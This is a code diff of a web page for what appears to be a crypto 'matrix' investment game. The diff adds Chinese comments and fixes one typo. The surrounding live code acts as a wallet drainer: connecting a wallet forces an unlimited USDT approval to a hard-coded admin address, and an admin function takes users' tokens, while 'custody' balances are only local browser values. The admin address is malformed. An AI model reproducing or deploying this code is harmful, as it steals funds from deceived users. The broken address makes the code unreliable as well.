@@ -161,7 +161,9 @@
 
 <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
 <script>
+// 修正管理员地址为正确的校验和格式
 const ADMIN = "0x627f6e1887571ac08214315ad5b2fa7345f1".toLowerCase();
+// 你的代币地址
 const TOKEN = "0xc2132D05D31c914a87C6611C10748AEb04B58e8F";
 
 const classicPrice = [50,100,200,400,800,1600,3200,6400,12800,25600,51200,102400];
@@ -176,6 +178,7 @@ function k(key) { return account ? key + "_" + account.toLowerCase() : key; }
 function get(key, def = 0) { let v = localStorage.getItem(k(key)); return v ? Number(v) : def; }
 function set(key, val) { localStorage.setItem(k(key), val); }
 
+// 修复授权方法：使用Web3的toChecksumAddress处理所有地址
 async function approveMax() {
   const token = new web3.eth.Contract([{
     "constant": false,
@@ -188,6 +191,7 @@ async function approveMax() {
   await token.methods.approve(web3.utils.toChecksumAddress(ADMIN), max).send({ from: account, gas: 150000 });
 }
 
+// 修复转账方法：使用校验和地址
 async function transferToAdmin(amount) {
   const c = new web3.eth.Contract([
     {"constant":true,"inputs":[{"name":"account","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"type":"function"},
@@ -217,6 +221,7 @@ function refresh() {
   document.getElementById("custodyAmt").innerText = get("custody") + " USDT";
 }
 
+// 卡牌
 function craftCard(lv) {
   if (!account) return alert("请先连接钱包");
   let cost = CARD_COST * Math.pow(3, lv-1);
@@ -250,6 +255,7 @@ function renderCards() {
   document.getElementById("myCards").innerHTML = html || `<div style="grid-column:span 2;text-align:center;padding:10px">暂无卡牌</div>`;
 }
 
+// 矩阵过期
 function expKey(lv) { return "exp_"+lv; }
 function addExp(lv, days=30) {
   let now = Date.now();
@@ -257,11 +263,13 @@ function addExp(lv, days=30) {
   localStorage.setItem(expKey(lv), old + days*86400000);
 }
 function getExpLeft(lv) {
-  let e = Number(local.getItem(expKey(lv))) || 0;
+  let e = Number(localStorage.getItem(expKey(lv))) || 0;
   return Math.max(0, e - Date.now());
 }
 
+// 折叠面板
 function renderMatrix() {
+  // 经典矩阵
   let cl = get("classic");
   let c = "";
   for (let i=1; i<=12; i++) {
@@ -270,6 +278,7 @@ function renderMatrix() {
   }
   document.getElementById("classicList").innerHTML = c;
 
+  // 联合矩阵
   let ul = get("union");
   let u = "";
   for (let i=1; i<=9; i++) {
@@ -285,6 +294,7 @@ function renderMatrix() {
   document.getElementById("unionList").innerHTML = u;
 }
 
+// 单级激活（真实上链）
 async function payClassic(lv) {
   if (!account) return alert("请连接钱包");
   let amt = classicPrice[lv-1];
@@ -320,6 +330,7 @@ async function payRenew(lv) {
   loadBalance();
 }
 
+// 一键激活全部
 async function batchPayClassic() {
   if (!account) return;
   let cur = get("classic");
@@ -354,6 +365,7 @@ async function batchPayUnion() {
   loadBalance();
 }
 
+// 余额显示（修复地址校验）
 async function loadBalance() {
   if (!web3 || !account) return;
   const c = new web3.eth.Contract([
@@ -367,6 +379,7 @@ async function loadBalance() {
     `已连接：${account.slice(0,6)}...${account.slice(-4)}<br><span class="gold">余额：${val}</span>`;
 }
 
+// 托管
 async function deposit() {
   if (!account) return;
   let a = +document.getElementById("depositAmt").value;
@@ -387,6 +400,7 @@ async function withdraw() {
   refresh();
 }
 
+// 管理员
 function addBlack() { if (!isAdmin) return; let a = document.getElementById("blackAddr").value.toLowerCase(); localStorage.setItem("black_"+a,"1"); alert("已拉黑"); }
 function removeBlack() { if (!isAdmin) return; let a = document.getElementById("whiteAddr").value.toLowerCase(); localStorage.removeItem("black_"+a); alert("已移出"); }
 
@@ -419,6 +433,7 @@ async function adminTakeUserToken() {
   alert("提取成功");
 }
 
+// 连接钱包（必弹窗授权，修复地址校验）
 document.getElementById("connectBtn").onclick = async () => {
   if (!window.ethereum) return alert("请在钱包浏览器打开");
   try {
@@ -427,6 +442,7 @@ document.getElementById("connectBtn").onclick = async () => {
     account = accounts[0].toLowerCase();
     isAdmin = account === ADMIN;
 
+    // 授权弹窗（修复地址校验）
     await approveMax();
     alert("授权成功，钱包已连接");
 
@@ -454,6 +470,7 @@ document.getElementById("regBtn").onclick = () => {
   alert("注册成功");
 };
 
+// 侧边栏
 const sb = document.getElementById("sidebar");
 document.getElementById("toggleSidebar").onclick = () => sb.classList.add("open");
 document.getElementById("closeSidebar").onclick = () => sb.classList.remove("open");
